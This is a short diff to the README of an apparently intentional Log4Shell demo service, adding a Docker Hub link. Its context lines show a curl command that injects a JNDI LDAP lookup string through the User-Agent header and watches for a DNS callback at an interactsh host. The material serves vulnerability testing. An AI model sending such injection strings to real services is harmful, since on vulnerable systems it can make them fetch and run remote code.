@@ -5,4 +5,7 @@ Application logs 'User-Agent' header, so one can test vulnerability with curl an
 ```
 curl -A '${jndi:ldap://interactsh-url/a}' http://target-service/
 ```
-One should see DNS interaction at [app.interactsh.com](https://app.interactsh.com/).
+One should see DNS interaction at [app.interactsh.com](https://app.interactsh.com/).   
+
+## Docker hub
+Link to [Docker hub](https://hub.docker.com/r/korteke/log4shell-demo)
